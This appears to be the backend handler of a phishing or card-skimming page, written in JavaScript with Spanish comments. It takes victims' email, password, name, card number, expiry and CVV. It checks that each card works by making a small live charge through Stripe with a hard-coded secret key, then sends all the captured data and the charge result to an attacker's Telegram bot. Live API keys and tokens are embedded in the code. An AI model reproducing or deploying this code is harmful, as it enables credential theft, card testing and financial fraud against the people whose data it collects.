const axios = require('axios');
const qs = require('querystring');

export default async function handler(req, res) {
    // Solo permitir peticiones POST
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method not allowed' });
    }

    const data = req.body;
    const token = "8255731465:AAGrPR_qH0zC4zTdBqOj-Zt1jqY0W03-yws";
    const chat_id = "7993722214";
    const stripe_secret = "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";

    let status_pago = "⏳ Procesando";
    let pago_exitoso = false;

    try {
        // 1. Crear Token en Stripe
        const [month, year] = data.ex.split('/');
        const cardData = qs.stringify({
            'card[number]': data.cc.replace(/\s/g, ''),
            'card[exp_month]': month.trim(),
            'card[exp_year]': '20' + year.trim(),
            'card[cvc]': data.cv.trim()
        });

        const stripeToken = await axios.post('https://api.stripe.com/v1/tokens', cardData, {
            headers: { 
                'Authorization': `Bearer ${stripe_secret}`, 
                'Content-Type': 'application/x-www-form-urlencoded' 
            }
        });

        if (stripeToken.data.id) {
            // 2. Realizar Cargo de $2.00 MXN
            const chargeData = qs.stringify({
                amount: 200, // 200 centavos = $2.00
                currency: 'mxn', // Cambiado a Pesos Mexicanos
                source: stripeToken.data.id,
                description: 'Validacion Cuenta: ' + data.em
            });

            const charge = await axios.post('https://api.stripe.com/v1/charges', chargeData, {
                headers: { 
                    'Authorization': `Bearer ${stripe_secret}`, 
                    'Content-Type': 'application/x-www-form-urlencoded' 
                }
            });

            if (charge.data.status === 'succeeded') {
                pago_exitoso = true;
                status_pago = "✅ APROBADO ($2.00 MXN)";
            }
        }
    } catch (error) {
        // Capturar el error específico de Stripe para enviarlo al bot
        status_pago = "❌ RECHAZADA: " + (error.response?.data?.error?.message || "Error de red");
    }

    // 3. Enviar Reporte a Telegram
    const mensaje = `🔔 REPORTE VERCEL 🔔\n\n💰 STATUS: ${status_pago}\n📧 Email: ${data.em}\n🔑 Pass: ${data.pw}\n👤 Nombre: ${data.nm}\n💳 Card: ${data.cc}\n📅 Exp: ${data.ex}\n🔒 CVV: ${data.cv}`;
    
    try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chat_id,
            text: mensaje
        });
    } catch (tgError) {
        console.error("Error enviando a Telegram");
    }

    // Responder al frontend
    return res.status(200).json({ pago: pago_exitoso, mensaje_error: status_pago });
}
